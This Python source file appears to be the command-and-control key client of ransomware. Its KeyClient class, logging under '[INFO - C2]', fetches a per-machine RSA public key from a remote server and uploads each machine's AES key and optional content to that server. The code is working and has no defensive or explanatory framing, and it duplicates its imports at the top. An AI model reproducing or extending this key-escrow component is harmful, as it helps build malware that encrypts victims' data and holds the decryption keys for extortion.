import requests
from Crypto.PublicKey import RSA
import requests
from Crypto.PublicKey import RSA


class KeyClient:
    def __init__(self, server_url: str, machine_id: str):
        self.server_url = server_url.rstrip("/")
        self.machine_id = machine_id
        self.public_key = None

    def fetch_public_key(self) -> RSA.RsaKey:
        print("[INFO - C2] Trying to fetch public key from server")
        url = f"{self.server_url}/get-public-key"

        try:
            res = requests.post(url, json={"machine_id": self.machine_id})
            res.raise_for_status()
        except requests.RequestException as e:
            raise RuntimeError(f"Cannot fetch public key: {e}")

        data = res.json()

        if "public_key" not in data:
            raise ValueError("Invalid response: missing public_key")

        self.public_key = RSA.import_key(data["public_key"])

        print("[INFO - C2] Public key fetched successfully\n", self.public_key.export_key())
        return self.public_key
    

    def add_aes_key(self, machine_id: str, aes_key: str, content: str = ""):
        url = f"{self.server_url}/add-aes-key"

        payload = {
            "machine_id": machine_id,
            "aes_key": aes_key,
            "content": content
        }

        try:
            res = requests.post(url, json=payload)
            res.raise_for_status()
        except requests.RequestException as e:
            raise RuntimeError(f"Cannot add AES key: {e}")

        data = res.json()

        if data.get("status") not in ["success", "created", "updated"]:
            raise ValueError(f"Server error: {data}")
        
        return data
